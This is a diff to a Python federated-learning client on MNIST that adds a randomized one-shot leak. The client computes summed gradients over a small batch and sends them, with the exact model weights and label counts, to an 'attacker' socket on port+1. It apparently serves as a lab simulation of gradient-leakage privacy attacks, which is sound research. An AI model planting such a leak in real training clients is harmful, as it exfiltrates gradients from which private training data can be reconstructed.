@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import sys, os, time, pickle
+import sys, os, time, pickle, random
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
 import argparse, socket, torch, torch.nn.functional as F
@@ -44,7 +44,15 @@ def main():
     all_ds = datasets.MNIST('./data', train=True, download=True, transform=tx)
     shard_idx = [i for i in range(len(all_ds)) if i % args.total_shards == args.shard]
     shard_ds = torch.utils.data.Subset(all_ds, shard_idx)
+
+    # Training loader (UNCHANGED): keep batch size 64 for normal training
     loader = DataLoader(shard_ds, batch_size=64, shuffle=True)
+
+    # Leak config: separate loader for the leak with adjustable batch size
+    LEAK_ONCE      = os.environ.get("LEAK_ONCE", "1") == "1"     # one-shot leak gate
+    LEAK_RANDOM_P  = float(os.environ.get("LEAK_RANDOM_P", "0.2"))  # chance to leak in a round
+    LEAK_BATCH_SIZE= int(os.environ.get("LEAK_BATCH_SIZE", "5"))    # leak batch size (e.g., 5 or 10)
+    leak_loader    = DataLoader(shard_ds, batch_size=LEAK_BATCH_SIZE, shuffle=True)
 
     device = 'cuda' if torch.cuda.is_available() else 'cpu'
     print(f"[client] starting | host={args.host}:{args.port} | shard={args.shard}/{args.total_shards} "
@@ -55,7 +63,9 @@ def main():
         s.connect((args.host, args.port))
         print(f"[client] connected", flush=True)
 
+        round_idx = 0
         while True:
+            round_idx += 1
             print("[client] waiting for global weights…", flush=True)
             try:
                 state_dict = recv_pkl(s)
@@ -66,53 +76,60 @@ def main():
                 print(f"[client] error receiving global weights: {e}. exiting.", flush=True)
                 return
 
-            # --- One-shot DLG leak (full parameter gradients for ONE image) ---
-            if os.environ.get("LEAK_DLG_ONCE") == "1":
+            # --- Random one-shot leak of SUM-of-gradients over a leak batch ---
+            # Only once, and only on a random round with probability LEAK_RANDOM_P
+            if LEAK_ONCE and (random.random() < LEAK_RANDOM_P):
                 try:
-                    # Rebuild model at current global weights (W_k)
                     model = SmallCNN(pretrained=False)
                     model.load_state_dict(state_dict)
-                    model.to(device).train()  # IMPORTANT: train() to match single-sample behavior
+                    model.to(device).train()  # train() to match single-sample/batch grad behavior
 
-                    # Take ONE sample so batch size = 1
-                    x, y = next(iter(loader))
-                    x0, y0 = x[:1].to(device), y[:1].to(device)
+                    # Take exactly one leak batch (size = LEAK_BATCH_SIZE)
+                    xb, yb = next(iter(leak_loader))
+                    xb, yb = xb.to(device), yb.to(device)
 
-                    # Compute loss and FULL gradient over ALL parameters (batch=1)
+                    # Compute SUM of per-example grads by using reduction='sum'
                     model.zero_grad()
-                    logits = model(x0)
-                    loss = F.cross_entropy(logits, y0)
-
-                    # Compute grads and keep them **by parameter name**
+                    logits = model(xb)
+                    loss = F.cross_entropy(logits, yb, reduction='sum')
                     params = [p for p in model.parameters()]
-                    grads = torch.autograd.grad(loss, params, create_graph=False)
+                    grads  = torch.autograd.grad(loss, params, create_graph=False)
 
+                    # Build name->grad dict
                     names = [n for n, _ in model.named_parameters()]
                     grads_by_name = {names[i]: grads[i].detach().cpu().float() for i in range(len(names))}
 
-                    # Also send the exact weights (CPU tensors) so attacker uses same W_k
+                    # Also send exact weights and label histogram for the leak batch
                     state_cpu = {k: v.detach().cpu() for k, v in state_dict.items()}
+                    # label_counts: {digit: count_in_batch}
+                    label_counts = {}
+                    for c in yb.unique():
+                        label_counts[int(c.item())] = int((yb == c).sum().item())
 
                     payload = {
-                        "grads_by_name": grads_by_name,
-                        "state_dict": state_cpu,
-                        "label": int(y0.item()),  # optional, not used by DLG
+                        "grads_by_name": grads_by_name,   # SUM over the leak batch
+                        "state_dict": state_cpu,          # exact W_k
+                        "label_counts": label_counts,     # batch composition
+                        "leak_batch_size": LEAK_BATCH_SIZE,
+                        "round_idx": round_idx,
                     }
                     data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
 
-                    # Send to attacker on (port+1), e.g., 12346
+                    # Send to attacker on (port+1)
                     atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     atk.settimeout(5.0)
                     atk.connect((args.host, args.port + 1))
                     atk.sendall(len(data).to_bytes(8, "big"))
                     atk.sendall(data)
                     atk.close()
-                    print("[client] leaked FULL gradient (named) for 1 image (DLG) to attacker", flush=True)
+                    print(f"[client] LEAKED batch-gradients: B={LEAK_BATCH_SIZE} "
+                          f"| label_counts={label_counts} | round={round_idx}", flush=True)
                 except Exception as e:
-                    print(f"[client] DLG leak failed: {e}", flush=True)
+                    print(f"[client] Leak failed: {e}", flush=True)
                 finally:
-                    os.environ["LEAK_DLG_ONCE"] = "0"
-
+                    # Disable future leaks
+                    LEAK_ONCE = False
+                    os.environ["LEAK_ONCE"] = "0"
 
             print(f"[client] received W_k ({_count_params(state_dict):,} params). training 1 local epoch…", flush=True)
 
